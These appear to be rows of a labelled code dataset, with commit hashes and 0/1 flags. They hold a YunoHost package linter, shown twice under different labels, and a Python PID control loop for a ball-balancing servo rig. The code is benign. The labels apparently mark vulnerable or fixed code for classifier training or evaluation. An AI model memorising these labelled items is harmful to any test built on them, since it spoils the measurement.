        self.path = app_path + ""/scripts/"" + name
        self.exists = file_exists(self.path)
        if not self.exists:
            return
        self.lines = list(self.read_file())

    def read_file(self):
        with open(self.path) as f:
            lines = f.readlines()

        # Remove trailing spaces, empty lines and comment lines
        lines = [line.strip() for line in lines]
        lines = [line for line in lines if line and not line.startswith('#')]

        # Merge lines when ending with \
        lines = '\n'.join(lines).replace(""\\\n"", """").split(""\n"")

        for line in lines:
            try:
                line = shlex.split(line, True)
                yield line
            except Exception as e:
                print_warning(""%s : Could not parse this line (%s) : %s"" % (self.path, e, line))

    def contains(self, command):
        """"""
        Iterate on lines to check if command is contained in line

        For instance, ""app setting"" is contained in ""yunohost app setting $app ...""
        """"""
        return any(command in line
                   for line in [ ' '.join(line) for line in self.lines])

    def analyze(self):

        print_header(self.name.upper() + "" SCRIPT"")

        self.check_verifications_done_before_modifying_system()
        self.check_set_usage()
        self.check_helper_usage_dependencies()
        self.check_deprecated_practices()

    def check_verifications_done_before_modifying_system(self):
        """"""
        Check if verifications are done before modifying the system
        """"""

        if not self.contains(""ynh_die"") and not self.contains(""exit""):
            return

        # FIXME : this really looks like a very small subset of command that
        # can be used ... also packagers are not supposed to use apt or service
        # anymore ...
        modifying_cmds = (""cp"", ""mkdir"", ""rm"", ""chown"", ""chmod"", ""apt-get"", ""apt"",
                          ""service"", ""find"", ""sed"", ""mysql"", ""swapon"", ""mount"",
                          ""dd"", ""mkswap"", ""useradd"")
        cmds_before_exit = []
        for cmd in self.lines:
            cmd = "" "".join(cmd)

            if ""ynh_die"" in cmd or ""exit"" in cmd:
                break
            cmds_before_exit.append(cmd)

        for modifying_cmd in modifying_cmds:
            if any(modifying_cmd in cmd for cmd in cmds_before_exit):
                print_error(
                    ""[YEP-2.4] 'ynh_die' or 'exit' command is executed with system modification before (cmd '%s').\n""
                    ""This system modification is an issue if a verification exit the script.\n""
                    ""You should move this verification before any system modification."" % modifying_cmd, False
                )
                return

    def check_set_usage(self):
        present = False

        if self.name in [""backup"", ""remove""]:
            present = self.contains(""ynh_abort_if_errors"") or self.contains(""set -eu"")
        else:
            present = self.contains(""ynh_abort_if_errors"")

        if self.name == ""remove"":
            # Remove script shouldn't use set -eu or ynh_abort_if_errors
            if present:
                print_error(
                    ""[YEP-2.4] set -eu or ynh_abort_if_errors is present. ""
                    ""If there is a crash, it could put yunohost system in ""
                    ""a broken state. For details, look at ""
                    ""https://github.com/YunoHost/issues/issues/419""
                )
        elif not present:
            print_error(
                ""[YEP-2.4] ynh_abort_if_errors is missing. For details, ""
                ""look at https://github.com/YunoHost/issues/issues/419""
            )

    def check_helper_usage_dependencies(self):
        """"""
        Detect usage of ynh_package_* & apt-get *
        and suggest herlpers ynh_install_app_dependencies and ynh_remove_app_dependencies
        """"""

        if self.contains(""ynh_package_install"") or self.contains(""apt-get install""):
            print_warning(
                ""You should not use `ynh_package_install` or `apt-get install`, ""
                ""use `ynh_install_app_dependencies` instead""
            )

        if self.contains(""ynh_package_remove"") or self.contains(""apt-get remove""):
            print_warning(
                ""You should not use `ynh_package_remove` or `apt-get remove`, ""
                ""use `ynh_remove_app_dependencies` instead""
            )

    def check_deprecated_practices(self):

        if self.contains(""yunohost app setting""):
            print_warning(""'yunohost app setting' shouldn't be used directly. Please use 'ynh_app_setting_(set,get,delete)' instead."")
        if self.contains(""yunohost app checkurl""):
            print_warning(""'yunohost app checkurl' is deprecated. Please use 'ynh_webpath_register' instead."")
        if self.contains(""yunohost app checkport""):
            print_warning(""'yunohost app checkport' is deprecated. Please use 'ynh_find_port' instead."")
        if self.contains(""yunohost app initdb""):
            print_warning(""'yunohost app initdb' is deprecated. Please use 'ynh_mysql_setup_db' instead."")
        if self.contains(""exit""):
            print_warning(""'exit' command shouldn't be used. Please use 'ynh_die' instead."")

        if self.contains(""rm -rf""):
            print_error(""[YEP-2.12] You should avoid using 'rm -rf', please use 'ynh_secure_remove' instead"")
        if self.contains(""sed -i""):
            print_warning(""[YEP-2.12] You should avoid using 'sed -i', please use 'ynh_replace_string' instead"")
        if self.contains(""sudo""):
            print_warning(
                ""[YEP-2.12] You should not need to use 'sudo', the script is being run as root. ""
                ""(If you need to run a command using a specific user, use 'ynh_exec_as')""
            )

        if self.contains(""dd if=/dev/urandom"") or self.contains(""openssl rand""):
            print_warning(
                ""Instead of 'dd if=/dev/urandom' or 'openssl rand', ""
                ""you might want to use ynh_string_random""
            )

        if self.contains(""systemctl restart nginx"") or self.contains(""service nginx restart""):
            print_error(
                ""Restarting nginx is quite dangerous (especially for web installs) ""
                ""and should be avoided at all cost. Use 'reload' instead.""
            )

        if self.name == ""install"" and not self.contains(""ynh_print_info"") and not self.contains(""ynh_script_progression""):
            print_warning(
                ""Please add a few messages for the user, to explain what is going on ""
                ""(in friendly, not-too-technical terms) during the installation. ""
                ""You can use 'ynh_print_info' or 'ynh_script_progression' for this.""
            )


def main():
    if len(sys.argv) != 2:
        print(""Give one app package path."")
        exit()

    app_path = sys.argv[1]
    header(app_path)
    App(app_path).analyze()
    sys.exit(return_code)


if __name__ == '__main__':
    main()
/n/n/n",0
139,f6e98894cfe841aedaa7efd590937f0255193913,"/package_linter.py/n/n#!/usr/bin/env python3
# -*- coding: utf8 -*-

import sys
import os
import re
import json
import shlex
import urllib.request
import codecs

reader = codecs.getreader(""utf-8"")
return_code = 0


# ############################################################################
#   Utilities
# ############################################################################


class c:
    HEADER = '\033[94m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    MAYBE_FAIL = '\033[96m'
    FAIL = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def header(app):
    print(""""""
    [{header}{bold}YunoHost App Package Linter{end}]

 App packaging documentation - https://yunohost.org/#/packaging_apps
 App package example         - https://github.com/YunoHost/example_ynh
 Official helpers            - https://yunohost.org/#/packaging_apps_helpers_en
 Experimental helpers        - https://github.com/YunoHost-Apps/Experimental_helpers

    Analyzing package {header}{app}{end}""""""
    .format(header=c.HEADER, bold=c.BOLD, end=c.END, app=app))


def print_header(str):
    print(""\n ["" + c.BOLD + c.HEADER + str.title() + c.END + ""]\n"")


def print_right(str):
    print(c.OKGREEN + ""✔"", str, c.END)


def print_warning(str):
    print(c.WARNING + ""!"", str, c.END)


def print_error(str, reliable=True):
    if reliable:
        global return_code
        return_code = 1
        print(c.FAIL + ""✘"", str, c.END)
    else:
        print(c.MAYBE_FAIL + ""?"", str, c.END)


def urlopen(url):
    try:
        conn = urllib.request.urlopen(url)
    except urllib.error.HTTPError as e:
        return {'content': '', 'code': e.code}
    except urllib.error.URLError as e:
        print('URLError')
    return {'content': conn.read().decode('UTF8'), 'code': 200}


def file_exists(file_path):
    return os.path.isfile(file_path) and os.stat(file_path).st_size > 0


# ############################################################################
#   Actual high-level checks
# ############################################################################

class App():

    def __init__(self, path):

        print_header(""LOADING APP"")
        self.path = path

        scripts = [""install"", ""remove"", ""upgrade"", ""backup"", ""restore""]
        self.scripts = {f: Script(self.path, f) for f in scripts}

    def analyze(self):

        self.misc_file_checks()
        self.check_helper_consistency()
        self.check_source_management()
        self.check_manifest()

        for script in self.scripts.values():
            if script.exists:
                script.analyze()

    def misc_file_checks(self):

        print_header(""MISC FILE CHECKS"")

        #
        # Check for recommended and mandatory files
        #

        filenames = (""manifest.json"", ""LICENSE"", ""README.md"",
                     ""scripts/install"", ""scripts/remove"",
                     ""scripts/upgrade"",
                     ""scripts/backup"", ""scripts/restore"")
        non_mandatory = (""script/backup"", ""script/restore"")

        for filename in filenames:
            if file_exists(self.path + ""/"" + filename):
                continue
            elif filename in non_mandatory:
                print_warning(""Consider adding a file %s"" % filename)
            else:
                print_error(""File %s is mandatory"" % filename)

        #
        # Deprecated php-fpm.ini thing
        #

        if file_exists(self.path + ""/conf/php-fpm.ini""):
            print_warning(
                ""Using a separate php-fpm.ini file is deprecated. ""
                ""Please merge your php-fpm directives directly in the pool file. ""
                ""(c.f. https://github.com/YunoHost-Apps/nextcloud_ynh/issues/138 )""
            )

        #
        # Deprecated usage of 'add_header' in nginx conf
        #

        for filename in os.listdir(self.path + ""/conf""):
            if not os.path.isfile(self.path + ""/conf/"" + filename):
                continue
            content = open(self.path + ""/conf/"" + filename).read()
            if ""location"" in content and ""add_header"" in content:
                print_warning(
                    ""Do not use 'add_header' in the nginx conf. Use 'more_set_headers' instead. ""
                    ""(See https://www.peterbe.com/plog/be-very-careful-with-your-add_header-in-nginx ""
                    ""and https://github.com/openresty/headers-more-nginx-module#more_set_headers )""
                )

    def check_helper_consistency(self):
        """"""
        check if ynh_install_app_dependencies is present in install/upgrade/restore
        so dependencies are up to date after restoration or upgrade
        """"""

        install_script = self.scripts[""install""]
        if install_script.exists:
            if install_script.contains(""ynh_install_app_dependencies""):
                for name in [""upgrade"", ""restore""]:
                    if self.scripts[name].exists and not self.scripts[name].contains(""ynh_install_app_dependencies""):
                        print_warning(""ynh_install_app_dependencies should also be in %s script"" % name)

            if install_script.contains(""yunohost service add""):
                if self.scripts[""remove""].exists and not self.scripts[""remove""].contains(""yunohost service remove""):
                    print_error(
                        ""You used 'yunohost service add' in the install script, ""
                        ""but not 'yunohost service remove' in the remove script.""
                    )

    def check_source_management(self):
        print_header(""SOURCES MANAGEMENT"")
        DIR = os.path.join(self.path, ""sources"")
        # Check if there is more than six files on 'sources' folder
        if os.path.exists(os.path.join(self.path, ""sources"")) \
           and len([name for name in os.listdir(DIR) if os.path.isfile(os.path.join(DIR, name))]) > 5:
            print_warning(
                ""[YEP-3.3] Upstream app sources shouldn't be stored in this 'sources' folder of this git repository as a copy/paste\n""
                ""During installation, the package should download sources from upstream via 'ynh_setup_source'.\n""
                ""See the helper documentation. ""
                ""Original discussion happened here : ""
                ""https://github.com/YunoHost/issues/issues/201#issuecomment-391549262""
            )

    def check_manifest(self):
        manifest = os.path.join(self.path, 'manifest.json')
        if not os.path.exists(manifest):
            return
        print_header(""MANIFEST"")
        """"""
        Check if there is no comma syntax issue
        """"""

        try:
            with open(manifest, encoding='utf-8') as data_file:
                manifest = json.loads(data_file.read())
        except:
            print_error(""[YEP-2.1] Syntax (comma) or encoding issue with manifest.json. Can't check file."")

        fields = (""name"", ""id"", ""packaging_format"", ""description"", ""url"", ""version"",
                  ""license"", ""maintainer"", ""requirements"", ""multi_instance"",
                  ""services"", ""arguments"")

        for field in fields:
            if field not in manifest:
                print_warning(""[YEP-2.1] \"""" + field + ""\"" field is missing"")

        """"""
        Check values in keys
        """"""

        if ""packaging_format"" not in manifest:
            print_error(""[YEP-2.1] \""packaging_format\"" key is missing"")
        elif not isinstance(manifest[""packaging_format""], int):
            print_error(""[YEP-2.1] \""packaging_format\"": value isn't an integer type"")
        elif manifest[""packaging_format""] != 1:
            print_error(""[YEP-2.1] \""packaging_format\"" field: current format value is '1'"")

        # YEP 1.1 Name is app
        if ""id"" in manifest:
            if not re.match('^[a-z1-9]((_|-)?[a-z1-9])+$', manifest[""id""]):
                print_error(""[YEP-1.1] 'id' field '%s' should respect this regex '^[a-z1-9]((_|-)?[a-z1-9])+$'"")

        if ""name"" in manifest:
            if len(manifest[""name""]) > 22:
                print_warning(
                    ""[YEP-1.1] The 'name' field shouldn't be too long to be able to be with one line in the app list. ""
                    ""The most current bigger name is actually compound of 22 characters.""
                )

        # YEP 1.2 Put the app in a weel known repo
        if ""id"" in manifest:
            official_list_url = ""https://raw.githubusercontent.com/YunoHost/apps/master/official.json""
            official_list = json.loads(urlopen(official_list_url)['content'])
            community_list_url = ""https://raw.githubusercontent.com/YunoHost/apps/master/community.json""
            community_list = json.loads(urlopen(community_list_url)['content'])
            if manifest[""id""] not in official_list and manifest[""id""] not in community_list:
                print_warning(""[YEP-1.2] This app is not registered in official or community applications"")

        # YEP 1.3 License
        def license_mentionned_in_readme(path):
            readme_path = os.path.join(path, 'README.md')
            if os.path.isfile(readme_path):
                return ""LICENSE"" in open(readme_path).read()
            return False

        if ""license"" in manifest:
            for license in manifest['license'].replace('&', ',').split(','):
                code_license = '<code property=""spdx:licenseId"">' + license + '</code>'
                link = ""https://spdx.org/licenses/""
                if license == ""nonfree"":
                    print_warning(""[YEP-1.3] The correct value for non free license in license field is 'non-free' and not 'nonfree'"")
                    license = ""non-free""
                if license in [""free"", ""non-free"", ""dep-non-free""]:
                    if not license_mentionned_in_readme(self.path):
                        print_warning(
                            ""[YEP-1.3] The use of '%s' in license field implies ""
                            "" to write something about the license in your README.md"" % (license)
                        )
                    if license in [""non-free"", ""dep-non-free""]:
                        print_warning(
                            ""[YEP-1.3] 'non-free' apps can't be officialized. ""
                            "" Their integration is still being discussed, especially for apps with non-free dependencies""
                        )
                elif code_license not in urlopen(link)['content']:
                    print_warning(
                        ""[YEP-1.3] The license '%s' is not registered in https://spdx.org/licenses/ . ""
                        ""It can be a typo error. If not, you should replace it by 'free' ""
                        ""or 'non-free' and give some explanations in the README.md."" % (license)
                    )

        # YEP 1.4 Inform if we continue to maintain the app
        # YEP 1.5 Update regularly the app status
        # YEP 1.6 Check regularly the evolution of the upstream

        # YEP 1.7 - Add an app to the YunoHost-Apps organization
        if ""id"" in manifest:
            repo = ""https://github.com/YunoHost-Apps/%s_ynh"" % (manifest[""id""])
            is_not_added_to_org =  urlopen(repo)['code'] == 404

            if is_not_added_to_org:
                print_warning(""[YEP-1.7] You should add your app in the YunoHost-Apps organisation."")

        # YEP 1.8 Publish test request
        # YEP 1.9 Document app
        if ""description"" in manifest:
            descr = manifest[""description""]
            if isinstance(descr, dict):
                descr = descr.get(""en"", None)

            if descr is None or descr == manifest.get(""name"", None):
                print_warning(
                    ""[YEP-1.9] You should write a good description of the app, ""
                    ""at least in english (1 line is enough).""
                )

            elif ""for yunohost"" in descr.lower():
                print_warning(
                    ""[YEP-1.9] The 'description' should explain what the app actually does. ""
                    ""No need to say that it is 'for YunoHost' - this is a YunoHost app ""
                    ""so of course we know it is for YunoHost ;-).""
                )

        # TODO test a specific template in README.md

        # YEP 1.10 Garder un historique de version propre

        # YEP 1.11 Cancelled

        # YEP 2.1
        if ""multi_instance"" in manifest and manifest[""multi_instance""] != 1 and manifest[""multi_instance""] != 0:
            print_error(
                ""[YEP-2.1] \""multi_instance\"" field must be boolean type values 'true' or 'false' and not string type"")

        if ""services"" in manifest:
            services = (""nginx"", ""mysql"", ""uwsgi"", ""metronome"",
                        ""php5-fpm"", ""php7.0-fpm"", ""php-fpm"",
                        ""postfix"", ""dovecot"", ""rspamd"")

            for service in manifest[""services""]:
                if service not in services:
                    # FIXME : wtf is it supposed to mean ...
                    print_warning(""[YEP-2.1] "" + service + "" service may not exist"")

        if ""install"" in manifest[""arguments""]:

            recognized_types = (""domain"", ""path"", ""boolean"", ""app"", ""password"", ""user"", ""string"")

            for argument in manifest[""arguments""][""install""]:
                if ""type"" not in argument.keys():
                    print_warning(
                        ""[YEP-2.1] You should specify the type of the argument '%s'. ""
                        ""You can use : %s."" % (argument[""name""], ', '.join(recognized_types))
                    )
                elif argument[""type""] not in recognized_types:
                    print_warning(
                        ""[YEP-2.1] The type '%s' for argument '%s' is not recognized... ""
                        ""it probably doesn't behave as you expect ? Choose among those instead : %s"" % (argument[""type""], argument[""name""], ', '.join(recognized_types))
                    )

                if ""choices"" in argument.keys():
                    choices = [c.lower() for c in argument[""choices""]]
                    if len(choices) == 2:
                        if (""true"" in choices and ""false"" in choices) or (""yes"" in choices and ""no"" in choices):
                            print_warning(
                                ""Argument %s : you might want to simply use a boolean-type argument. ""
                                ""No need to specify the choices list yourself."" % argument[""name""]
                            )

        if ""url"" in manifest and manifest[""url""].endswith(""_ynh""):
            print_warning(
                ""'url' is not meant to be the url of the yunohost package, ""
                ""but rather the website or repo of the upstream app itself...""
            )


class Script():

    def __init__(self, app_path, name):
        self.name = name
        self.path = app_path + ""/scripts/"" + name
        self.exists = file_exists(self.path)
        if not self.exists:
            return
        self.lines = list(self.read_file())

    def read_file(self):
        with open(self.path) as f:
            lines = f.readlines()

        # Remove trailing spaces, empty lines and comment lines
        lines = [line.strip() for line in lines]
        lines = [line for line in lines if line and not line.startswith('#')]

        # Merge lines when ending with \
        lines = '\n'.join(lines).replace(""\\\n"", """").split(""\n"")

        for line in lines:
            try:
                line = shlex.split(line, True)
                yield line
            except Exception as e:
                print_warning(""%s : Could not parse this line (%s) : %s"" % (self.path, e, line))

    def contains(self, command):
        """"""
        Iterate on lines to check if command is contained in line

        For instance, ""app setting"" is contained in ""yunohost app setting $app ...""
        """"""
        return any(command in line
                   for line in [ ' '.join(line) for line in self.lines])

    def analyze(self):

        print_header(self.name.upper() + "" SCRIPT"")

        self.check_verifications_done_before_modifying_system()
        self.check_set_usage()
        self.check_helper_usage_dependencies()
        self.check_deprecated_practices()

    def check_verifications_done_before_modifying_system(self):
        """"""
        Check if verifications are done before modifying the system
        """"""

        if not self.contains(""ynh_die"") and not self.contains(""exit""):
            return

        # FIXME : this really looks like a very small subset of command that
        # can be used ... also packagers are not supposed to use apt or service
        # anymore ...
        modifying_cmds = (""cp"", ""mkdir"", ""rm"", ""chown"", ""chmod"", ""apt-get"", ""apt"",
                          ""service"", ""find"", ""sed"", ""mysql"", ""swapon"", ""mount"",
                          ""dd"", ""mkswap"", ""useradd"")
        cmds_before_exit = []
        for cmd in self.lines:
            cmd = "" "".join(cmd)

            if ""ynh_die"" in cmd or ""exit"" in cmd:
                break
            cmds_before_exit.append(cmd)

        for modifying_cmd in modifying_cmds:
            if any(modifying_cmd in cmd for cmd in cmds_before_exit):
                print_error(
                    ""[YEP-2.4] 'ynh_die' or 'exit' command is executed with system modification before (cmd '%s').\n""
                    ""This system modification is an issue if a verification exit the script.\n""
                    ""You should move this verification before any system modification."" % modifying_cmd, False
                )
                return

    def check_set_usage(self):
        present = False

        if self.name in [""backup"", ""remove""]:
            present = self.contains(""ynh_abort_if_errors"") or self.contains(""set -eu"")
        else:
            present = self.contains(""ynh_abort_if_errors"")

        if self.name == ""remove"":
            # Remove script shouldn't use set -eu or ynh_abort_if_errors
            if present:
                print_error(
                    ""[YEP-2.4] set -eu or ynh_abort_if_errors is present. ""
                    ""If there is a crash, it could put yunohost system in ""
                    ""a broken state. For details, look at ""
                    ""https://github.com/YunoHost/issues/issues/419""
                )
        elif not present:
            print_error(
                ""[YEP-2.4] ynh_abort_if_errors is missing. For details, ""
                ""look at https://github.com/YunoHost/issues/issues/419""
            )

    def check_helper_usage_dependencies(self):
        """"""
        Detect usage of ynh_package_* & apt-get *
        and suggest herlpers ynh_install_app_dependencies and ynh_remove_app_dependencies
        """"""

        if self.contains(""ynh_package_install"") or self.contains(""apt-get install""):
            print_warning(
                ""You should not use `ynh_package_install` or `apt-get install`, ""
                ""use `ynh_install_app_dependencies` instead""
            )

        if self.contains(""ynh_package_remove"") or self.contains(""apt-get remove""):
            print_warning(
                ""You should not use `ynh_package_remove` or `apt-get remove`, ""
                ""use `ynh_remove_app_dependencies` instead""
            )

    def check_deprecated_practices(self):

        if self.contains(""yunohost app setting""):
            print_warning(""'yunohost app setting' shouldn't be used directly. Please use 'ynh_app_setting_(set,get,delete)' instead."")
        if self.contains(""yunohost app checkurl""):
            print_warning(""'yunohost app checkurl' is deprecated. Please use 'ynh_webpath_register' instead."")
        if self.contains(""yunohost app checkport""):
            print_warning(""'yunohost app checkport' is deprecated. Please use 'ynh_find_port' instead."")
        if self.contains(""yunohost app initdb""):
            print_warning(""'yunohost app initdb' is deprecated. Please use 'ynh_mysql_setup_db' instead."")
        if self.contains(""exit""):
            print_warning(""'exit' command shouldn't be used. Please use 'ynh_die' instead."")

        if self.contains(""rm -rf""):
            print_error(""[YEP-2.12] You should avoid using 'rm -rf', please use 'ynh_secure_remove' instead"")
        if self.contains(""sed -i""):
            print_warning(""[YEP-2.12] You should avoid using 'sed -i', please use 'ynh_replace_string' instead"")
        if self.contains(""sudo""):
            print_warning(
                ""[YEP-2.12] You should not need to use 'sudo', the script is being run as root. ""
                ""(If you need to run a command using a specific user, use 'ynh_exec_as')""
            )

        if self.contains(""dd if=/dev/urandom"") or self.contains(""openssl rand""):
            print_warning(
                ""Instead of 'dd if=/dev/urandom' or 'openssl rand', ""
                ""you might want to use ynh_string_random""
            )

        if self.contains(""systemctl restart nginx"") or self.contains(""service nginx restart""):
            print_error(
                ""Restarting nginx is quite dangerous (especially for web installs) ""
                ""and should be avoided at all cost. Use 'reload' instead.""
            )

        if self.name == ""install"" and not self.contains(""ynh_print_info"") and not self.contains(""ynh_script_progression""):
            print_warning(
                ""Please add a few messages for the user, to explain what is going on ""
                ""(in friendly, not-too-technical terms) during the installation. ""
                ""You can use 'ynh_print_info' or 'ynh_script_progression' for this.""
            )


def main():
    if len(sys.argv) != 2:
        print(""Give one app package path."")
        exit()

    app_path = sys.argv[1]
    header(app_path)
    App(app_path).analyze()
    sys.exit(return_code)


if __name__ == '__main__':
    main()
/n/n/n",1
140,d7e7869ba3a5b040215ac4426b4dc10ad8f8e20d,"PythonCode/Ballance.py/n/nif __name__ == '__main__':
    simulationMode = True    #czy uruchomic program w trybie symulacji? wymaga rowniez zmiany w ServoControllerModule.py oraz w ImageProcessingModule.py

    import ImageProcessingModule as IPM
    import ServoControllerModule as SCM
    import PIDControllerModule as PIDCM
    import DataLoggerModule as DLM
    import PathPlannerModule as PPM
    
    from time import sleep
    import time
    import pygame
    import math
    import MathModule as MM

    #wykonanie wstepnych czynnosci
    if simulationMode:
        import SimulationCommunicatorModule as SimCM
        simulationCommunicator = SimCM.SimulationCommunicator()
    else: simulationCommunicator = None
    
    imageProcessor = IPM.ImageProcessor(simulationCommunicator)
    servoController = SCM.ServoController()
    pathPlanner = PPM.PathPlanner()
        
    dataLogger = DLM.DataLogger()
    pidController = PIDCM.PIDController()
    pidController.servo_pos_limit = servoController.servo_pos_limit

    pygame.init()
    pygame.display.set_mode((100, 100))

    #roizpoczynanie procesu wykrywania kulki
    if simulationMode: simulationCommunicator.StartProcessing()
    imageProcessor.StartProcessing()
    pathPlanner.startProcessing(imageProcessor.obstacle_map)

    targetDeltaTime = 1.0 / 40.0    #czas jednej iteracji programu sterujacego
    updatedTime = 0.0
    servoUpdateDeltaTime = 1.0 / 60 #czas odswiezania pozycji serw
    servoUpdatedTime = 0.0

    ball_position_actual = (0.0, 0.0)
    ball_position_previous = (0.0, 0.0)

    #parametry trajektorii kulki
    angle = 0.0
    angleSpeed = 0.9
    angleRadius = 0.25
    angleRadiusFactor = 0.0
    path_targets = [(0.18, 0.18), (0.82, 0.82)]
    path_target_index = 0
    targetPos = path_targets[path_target_index]
    moveSpeed = 0.05
    movementMode = 0
    modeChangeTimeDelta = 25 #czas po jakim zmieniana jest trajektoria kulki
    modeChangeTimer = 0.0

    #jak dlugo wykonywany ma byc program
    duration = 10000
    timeout = time.time() + duration
    ball_just_found = True    #czy kulka dopiero zostala znaleziona i nalezy zresetowac predkosc?

    #glowna petla programu
    while time.time() <= timeout:
        timeStart = time.perf_counter()
        
        #oczekiwanie na odpowiedni moment do wykonania programu sterujacego
        if timeStart - updatedTime >= targetDeltaTime:
            updatedTime = time.perf_counter()
            
            #pobranie pozycji kulki
            ball_position_actual = imageProcessor.getBallPosition()
            if ball_position_actual[0] >= 0: pidController.setActualValue(ball_position_actual)
            else: pidController.setActualValue(pidController.value_target)
                
            #aktualizacja kontrolera PID
            pidController.update(targetDeltaTime)
            ball_position_previous = ball_position_actual
            
            #aktualizacja pozycji kulki w pathplannerze
            pathPlanner.setBallPosition(ball_position_actual)
            pidController.setTargetValue(pathPlanner.getPathTarget())
            
            #przechodzenie do kolejnego waypoint'a
            if MM.sqrMagnitude(ball_position_actual[0] - targetPos[0], ball_position_actual[1] - targetPos[1]) < 0.01:
                path_target_index = (path_target_index + 1) % len(path_targets)
                targetPos = path_targets[path_target_index]
                pathPlanner.setTargetPosition(targetPos)
            #print(str(pidController.value_target))
            
            #obslugiwanie wejscia z klawiatury
            killLoop = False
            for event in pygame.event.get():
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_g:
                        pidController.increaseKP()
                        
                    elif event.key == pygame.K_b:
                        pidController.decreaseKP()
                        
                    elif event.key == pygame.K_h:
                        pidController.increaseKI()
                        
                    elif event.key == pygame.K_n:
                        pidController.decreaseKI()
                        
                    elif event.key == pygame.K_j:
                        pidController.increaseKD()
                        
                    elif event.key == pygame.K_m:
                        pidController.decreaseKD()
                        
                    elif event.key == pygame.K_q:
                        killLoop = True
                        
                    elif event.key == pygame.K_UP:
                        targetPos[1] -= moveSpeed
                        
                    elif event.key == pygame.K_DOWN:
                        targetPos[1] += moveSpeed
                        
                    elif event.key == pygame.K_RIGHT:
                        targetPos[0] += moveSpeed
                        
                    elif event.key == pygame.K_LEFT:
                        targetPos[0] -= moveSpeed
                        
                    elif event.key == pygame.K_p:
                        angleSpeed += 0.1
                        print(""angleSpeed = "" + str(angleSpeed))
                        
                    elif event.key == pygame.K_o:
                        angleSpeed -= 0.1
                        print(""angleSpeed = "" + str(angleSpeed))
                        
            if killLoop:
                break
            
            #ustawianie nowych pozycji serw
            servoController.moveServo(0, round(pidController.x_servo))
            servoController.moveServo(1, -round(pidController.y_servo))
            
            #dostepne trajektorie ruchu kulki
            if False:
                if movementMode == 0:    #ksztalt osemki
                    targetPos[0] = math.sin(angle)
                    targetPos[1] = math.sin(2.0 * angle)
                elif movementMode == 1:  #ksztalt okregu
                    targetPos[0] = math.sin(angle)
                    targetPos[1] = math.cos(angle)
                elif movementMode == 2:   #ksztalt paraboli
                    targetPos[0] = math.sin(angle)
                    targetPos[1] = math.cos(2.0 * angle)
                elif movementMode == 3:   #ksztalt litery S
                    targetPos[0] = math.sin(angle)
                    targetPos[1] = math.sin(2.0 * angle)
                    if angle > 2:
                        angleSpeed = -angleSpeed
                        angle = 2
                    elif angle < -2:
                        angleSpeed = -angleSpeed
                        angle = -2
                    
            #targetPos[0] = 0.5 + angleRadiusFactor * angleRadius * targetPos[0]
            #targetPos[1] = 0.5 + angleRadiusFactor * angleRadius * targetPos[1]
            #ustawianie docelowej pozycji kulki
            #pidController.setTargetValue(targetPos[0], targetPos[1])
            #pathPlanner.setTargetPosition(tuple(targetPos))
            angle += angleSpeed * targetDeltaTime
            angleRadiusFactor += 0.25 * targetDeltaTime
            angleRadiusFactor = min(angleRadiusFactor, 1.0)
            
            modeChangeTimer += targetDeltaTime
            if modeChangeTimer >= modeChangeTimeDelta:
                modeChangeTimer = 0.0
                angleRadiusFactor = 0.0
                movementMode += 1
                movementMode = movementMode % 4
            
            #dodawanie wpisow do DataLog'u
            if False:
                path_target = pathPlanner.getPathTarget()
                dataLogger.addRecord(""timestamp"", time.perf_counter())
                dataLogger.addRecord(""ball_pos_x"", ball_position_actual[0])
                dataLogger.addRecord(""ball_pos_y"", ball_position_actual[1])
                dataLogger.addRecord(""target_pos_x"", path_target[0])
                dataLogger.addRecord(""target_pos_y"", path_target[1])
                dataLogger.addRecord(""KP"", pidController.KP)
                dataLogger.addRecord(""KI"", pidController.KI)
                dataLogger.addRecord(""KD"", pidController.KD)
                dataLogger.addRecord(""error_x"", pidController.x_error)
                dataLogger.addRecord(""error_y"", pidController.y_error)
                dataLogger.addRecord(""error_prev_x"", pidController.x_prev_error)
                dataLogger.addRecord(""error_prev_y"", pidController.y_prev_error)
                dataLogger.addRecord(""error_sum_x"", pidController.x_error_sum)
                dataLogger.addRecord(""error_sum_y"", pidController.y_error_sum)
                dataLogger.addRecord(""derivative_x"", pidController.x_derivative)
                dataLogger.addRecord(""derivative_y"", pidController.y_derivative)
                dataLogger.addRecord(""servo_actual_x"", servoController.servo_actual_pos[0])
                dataLogger.addRecord(""servo_actual_y"", servoController.servo_actual_pos[1])
                dataLogger.addRecord(""servo_target_x"", servoController.servo_target_pos[0])
                dataLogger.addRecord(""servo_target_y"", servoController.servo_target_pos[1])
                dataLogger.saveRecord()
            
        #oczekiwanie na odpowiedni moment do aktualizacji serw
        if time.perf_counter() - servoUpdatedTime >= servoUpdateDeltaTime:
            servoController.update(time.perf_counter() - servoUpdatedTime)
            servoUpdatedTime = time.perf_counter()
            
            if simulationMode:
                simulationCommunicator.moveServos(servoController.servo_actual_pos)
                
        sleep(0.004) #4 milisekundy na odpoczynek :)
            
    print(""Stopping program"")
    #dataLogger.saveToFile(""BallanceDataLog"")
    if simulationMode: simulationCommunicator.StopProcessing()
    else: imageProcessor.StopProcessing()
    pathPlanner.stopProcessing()/n/n/nPythonCode/ImageProcessingModule.py/n/nsimulationMode = True

if not simulationMode:
    import TensorflowProcessingModule as TPM
    from imutils.video.pivideostream import PiVideoStream

import MathModule as MM
import math, time, copy
import cv2
import numpy as np
from multiprocessing import Process, RawValue, RawArray
 
#program sluzacy do analizy obrazu z kamery, wykrywania kulki
class ImageProcessor:
    
    #parametry kamery
    camera_resolution = (256, 256)
    camera_framerate = 40
    
    corner_detecton_area = (0.08, 0.08, 0.14, 0.14) #prostakat, w ktorym szukana jest krawedz plyty, jest on powielany dla kazdego rogu obrazu
    detection_image_resolution = (200, 200)
    detection_image_resolution_cropped = (-1, -1)
    
    #rozmiar bitmapy przeszkod
    obstacle_map_size = 40
    obstacle_map_update_delta = 40
        
    def __init__(self, _simulationCommunicator=None):
        print(""ImageProcessor object created"")
        self.simulationCommunicator = _simulationCommunicator
        #wartosci-rezultaty przetwarzania obrazu
        self.result_x = RawValue('f', 0.0)
        self.result_y = RawValue('f', 0.0)
        self.key = RawValue('i', 0)
        
        self.obstacle_map = RawArray('i', ImageProcessor.obstacle_map_size**2)
        self.obstacle_map_update_counter = 0
        
    def getBallPosition(self):    #zwraca pozycje kulki
        if simulationMode: return self.simulationCommunicator.getBallPosition()
        return (self.result_x.value, self.result_y.value)
        
